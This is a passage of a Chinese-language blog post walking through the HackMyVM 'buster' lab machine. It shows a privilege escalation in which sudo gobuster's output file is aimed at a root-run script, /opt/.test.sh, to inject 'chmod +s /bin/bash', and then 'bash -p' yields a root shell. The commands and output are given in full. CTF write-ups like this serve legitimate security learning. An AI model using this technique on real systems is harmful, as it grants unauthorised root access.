+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> gobuster -u <span class="string">&quot;http://192.168.56.101:8080&quot;</span> -w /root/root.txt</span></span><br><span class="line">2025/02/24 08:12:20 [!] 1 error occurred:</span><br><span class="line">        * Wordlist (-w): File does not exist: /root/root.txt</span><br></pre></td></tr></table></figure>
+
+<p>下一个pspy看看</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502242123181.png" alt="image-20250224212336104"></p>
+<p><code>root</code>用户会定时执行<code>/opt/.test.sh</code></p>
+<p>这里突然间想到了</p>
+<p>可以用python起一个htpp服务器然后在里面依次放入<code>bin</code> <code>chmod +s </code> <code>bin</code> <code>bash</code>文件夹以及文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/hackmyvm/empty]</span><br><span class="line">└─# tree</span><br><span class="line">.</span><br><span class="line">└── bin</span><br><span class="line">    └── chmod +s </span><br><span class="line">        └── bin</span><br><span class="line">            └── bash</span><br><span class="line"></span><br><span class="line">4 directories, 1 file</span><br></pre></td></tr></table></figure>
+
+<p>然后创建一个字典文件里面只写<code>bin/chmod +s /bin/bash</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> 1</span></span><br><span class="line">bin/chmod +s /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>然后执行<code>sudo /usr/bin/gobuster -u http://192.168.56.103:8000/ -w /home/welcome/1 -o res</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">welcome@listen:~$ cat res</span><br><span class="line">/bin/chmod +s /bin/bash (Status: 200)</span><br><span class="line">welcome@listen:~$ </span><br></pre></td></tr></table></figure>
+
+<p>得到的结果是我们想要的</p>
+<p>但是多了一个 (Status: 200)</p>
+<p>后来我才知道<code>-n</code>参数可以忽略吊响应码</p>
+<p>在命令后加一个<code>-n</code>参数后</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">welcome@listen:~$ cat res</span><br><span class="line">/bin/chmod +s /bin/bash</span><br><span class="line">welcome@listen:~$ </span><br></pre></td></tr></table></figure>
+
+<p>后面没任何东西了</p>
+<p>刚好是我们想要的</p>
+<p>接下来就是把他加入到<code>/opt/.tets.sh</code>中</p>
+<p>执行<code>sudo /usr/bin/gobuster -u &quot;http://192.168.56.103:8000/&quot; -w /home/welcome/1 -o /opt/.test.sh -n </code></p>
+<p>再看<code>/bin/bash</code>的权限,已经加上了<code>s</code>位</p>
+  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">welcome@listen:~$ ls -al /bin/bash</span><br><span class="line">-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash</span><br><span class="line">welcome@listen:~$ </span><br></pre></td></tr></table></figure>
+
+<p>之后执行 <code>bash -p</code>就是<code>root</code>权限了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">welcome@listen:~$ bash -p</span><br><span class="line">bash-5.0# whoami</span><br><span class="line">root</span><br><span class="line">bash-5.0# id</span><br><span class="line">uid=1001(welcome) gid=1001(welcome) euid=0(root) egid=0(root) groups=0(root),1001(welcome)</span><br><span class="line">bash-5.0# </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://yliken.github.io">Yliken</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://yliken.github.io/2025/02/24/hackmyvm-buster/">http://yliken.github.io/2025/02/24/hackmyvm-buster/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yliken.github.io" target="_blank">Yliken</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/hackmyvm/">hackmyvm</a></div><div class="post_share"><div class="social-share" data-image="/img/essayhead/22.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/essayhead/as.jpg" target="_blank"><img class="post-qr-code-img" src="/img/essayhead/as.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/essayhead/as.jpg" target="_blank"><img class="post-qr-code-img" src="/img/essayhead/as.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/12/15/2024.12.15CISCN&amp;%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B/" title="	"><img class="cover" src="/img/essayhead/35.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">	</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/essayhead/second.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Yliken</div><div class="author-info__description">在我面前还有多少路要走，还有多少山峰要去翻越寻找自己，我又将多少次跌下悬崖，一切又从零开始，而这些是否会有意义……我会稍作等待，然后开始上路，跟随着梦想与希望，不要熄灭，我的星星，请等我……</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Yliken"><i class="fab fa-github"></i><span>Github</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Yliken" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:largetlafonu71@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">人一定要学会自渡；烦躁的时候不要说话，也不要做任何决定，安静的待会，成年人的烦恼好像和谁说都不合适，要学会自我消化，想开，看开，放开，睡前原谅一切，醒来便是重生，这个世界上从来没有感同身受，你可以消沉，也可以抱怨，甚至可以崩溃，但你一定要懂得自愈，这个世界上没有多少人心疼你，自渡是一种能力，渡人是一种格局，活着就该逢山开路，遇水架桥……</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/02/24/hackmyvm-buster/" title="hackmyvm-buster"><img src="/img/essayhead/22.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hackmyvm-buster"/></a><div class="content"><a class="title" href="/2025/02/24/hackmyvm-buster/" title="hackmyvm-buster">hackmyvm-buster</a><time datetime="2025-02-23T16:00:00.000Z" title="发表于 2025-02-24 00:00:00">2025-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/15/2024.12.15CISCN&amp;%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B/" title="	"><img src="/img/essayhead/35.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="	"/></a><div class="content"><a class="title" href="/2024/12/15/2024.12.15CISCN&amp;%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B/" title="	">	</a><time datetime="2024-12-14T16:00:00.000Z" title="发表于 2024-12-15 00:00:00">2024-12-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/28/Golang%20gorm/" title="Go小记 Gorm模型"><img src="/img/essayhead/23.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Go小记 Gorm模型"/></a><div class="content"><a class="title" href="/2024/11/28/Golang%20gorm/" title="Go小记 Gorm模型">Go小记 Gorm模型</a><time datetime="2024-11-27T16:00:00.000Z" title="发表于 2024-11-28 00:00:00">2024-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/17/golangSSH/" title="Go小记 使用Go实现SSH客户端"><img src="/img/essayhead/12.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Go小记 使用Go实现SSH客户端"/></a><div class="content"><a class="title" href="/2024/11/17/golangSSH/" title="Go小记 使用Go实现SSH客户端">Go小记 使用Go实现SSH客户端</a><time datetime="2024-11-16T16:00:00.000Z" title="发表于 2024-11-17 00:00:00">2024-11-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/06/SOCKS5/" title="SOCKS5协议"><img src="/img/essayhead/24.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SOCKS5协议"/></a><div class="content"><a class="title" href="/2024/11/06/SOCKS5/" title="SOCKS5协议">SOCKS5协议</a><time datetime="2024-11-05T16:00:00.000Z" title="发表于 2024-11-06 00:00:00">2024-11-06</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/essayhead/22.webp')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Yliken</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
